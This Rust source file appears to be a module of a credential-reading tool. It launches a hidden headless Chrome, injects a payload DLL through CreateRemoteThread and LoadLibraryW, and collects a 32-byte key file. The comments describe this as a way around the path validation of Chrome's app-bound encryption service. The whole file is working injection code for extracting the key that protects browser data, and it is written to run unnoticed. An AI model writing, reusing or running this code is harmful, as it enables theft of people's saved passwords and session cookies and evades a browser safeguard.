//! Plan B: run the app-bound COM call from inside a real chrome.exe so the
//! elevation service's path validation passes. Launches headless Chrome,
//! injects the payload DLL with CreateRemoteThread + LoadLibraryA, waits for
//! the key file, then terminates Chrome.
//!
//! Chrome is launched headless with GPU disabled so it never takes focus or
//! touches the GPU another session's game may be using. Only the child
//! process we launched is ever terminated.

use crate::ffi::*;
use core::ffi::c_void;
use core::ptr::null_mut;

struct Handle(HANDLE);

impl Handle {
    fn null() -> Self {
        Handle(null_mut())
    }
    fn is_null(&self) -> bool {
        self.0.is_null()
    }
}

impl Drop for Handle {
    fn drop(&mut self) {
        unsafe {
            if !self.0.is_null() {
                CloseHandle(self.0);
                self.0 = null_mut();
            }
        }
    }
}

fn gle(stage: &str) -> String {
    unsafe { format!("{stage} failed: gle=0x{:08x}", GetLastError()) }
}

pub fn chrome_inject_decrypt(
    chrome_exe: &str,
    dll_path: &str,
    workdir: &str,
) -> Result<Vec<u8>, String> {
    std::env::set_var("CREDREAD_WORKDIR", workdir);

    let cmd = format!(
        "\"{chrome_exe}\" --headless=new --disable-gpu --no-first-run \
         --no-default-browser-check --user-data-dir=\"{workdir}\\profile\" about:blank"
    );
    let mut cmd_w = wide(&cmd);
    let mut si: STARTUPINFOW = unsafe { core::mem::zeroed() };
    si.cb = core::mem::size_of::<STARTUPINFOW>() as u32;
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    let mut pi: PROCESS_INFORMATION = unsafe { core::mem::zeroed() };
    let ok = unsafe {
        CreateProcessW(
            null_mut(),
            cmd_w.as_mut_ptr(),
            null_mut(),
            null_mut(),
            FALSE,
            0,
            null_mut(),
            null_mut(),
            &si,
            &mut pi,
        )
    };
    if ok == 0 {
        return Err(gle("CreateProcessW(chrome)"));
    }
    let child = Handle(pi.hProcess);
    let _child_thread = Handle(pi.hThread);

    unsafe { Sleep(2500) };

    let access = PROCESS_CREATE_THREAD
        | PROCESS_VM_OPERATION
        | PROCESS_VM_READ
        | PROCESS_VM_WRITE
        | PROCESS_QUERY_INFORMATION;
    let proc = Handle(unsafe { OpenProcess(access, FALSE, pi.dwProcessId) });
    if proc.is_null() {
        unsafe { TerminateProcess(child.0, 1) };
        return Err(gle("OpenProcess(chrome)"));
    }

    let dll_w = wide(dll_path);
    let nbytes = dll_w.len() * 2;
    let remote = unsafe {
        VirtualAllocEx(
            proc.0,
            null_mut(),
            nbytes,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        )
    };
    if remote.is_null() {
        unsafe { TerminateProcess(child.0, 1) };
        return Err(gle("VirtualAllocEx"));
    }
    let mut written: SIZE_T = 0;
    let ok = unsafe {
        WriteProcessMemory(
            proc.0,
            remote,
            dll_w.as_ptr() as LPCVOID,
            nbytes,
            &mut written,
        )
    };
    if ok == 0 || written != nbytes {
        unsafe { TerminateProcess(child.0, 1) };
        return Err(gle("WriteProcessMemory(dll path)"));
    }
    let k32 = unsafe { GetModuleHandleA("kernel32.dll\0".as_ptr()) };
    if k32.is_null() {
        unsafe { TerminateProcess(child.0, 1) };
        return Err(gle("GetModuleHandleA(kernel32)"));
    }
    let loadlib = unsafe { GetProcAddress(k32, "LoadLibraryW\0".as_ptr()) };
    if loadlib.is_null() {
        unsafe { TerminateProcess(child.0, 1) };
        return Err(gle("GetProcAddress(LoadLibraryW)"));
    }
    let thread = Handle(unsafe {
        CreateRemoteThread(proc.0, null_mut(), 0, loadlib, remote, 0, null_mut())
    });
    if thread.is_null() {
        unsafe { TerminateProcess(child.0, 1) };
        return Err(gle("CreateRemoteThread"));
    }
    let w = unsafe { WaitForSingleObject(thread.0, 15000) };
    if w != WAIT_OBJECT_0 {
        unsafe { TerminateProcess(child.0, 1) };
        return Err(format!("CreateRemoteThread join: wait=0x{w:08x}"));
    }
    let mut code: DWORD = 0;
    let ok = unsafe { GetExitCodeThread(thread.0, &mut code) };
    if ok == 0 || code == 0 {
        unsafe { TerminateProcess(child.0, 1) };
        return Err(format!(
            "LoadLibraryW in chrome failed (exit=0x{code:08x})"
        ));
    }

    // Wait for the payload's key file.
    let key_path = format!("{workdir}\\key.bin");
    let status_path = format!("{workdir}\\status.txt");
    let mut key: Option<Vec<u8>> = None;
    for _ in 0..120 {
        if let Ok(b) = std::fs::read(&key_path) {
            if !b.is_empty() {
                key = Some(b);
                break;
            }
        }
        unsafe { Sleep(250) };
    }
    unsafe { TerminateProcess(child.0, 0) };

    let status = std::fs::read_to_string(&status_path).unwrap_or_default();
    match key {
        Some(k) => {
            if k.len() != 32 {
                return Err(format!(
                    "payload wrote {} key bytes (status: {status})",
                    k.len()
                ));
            }
            Ok(k)
        }
        None => Err(format!("timed out waiting for key file (status: {status})")),
    }
}

#[allow(unused)]
pub fn unused_cvoid(_: *mut c_void) {}
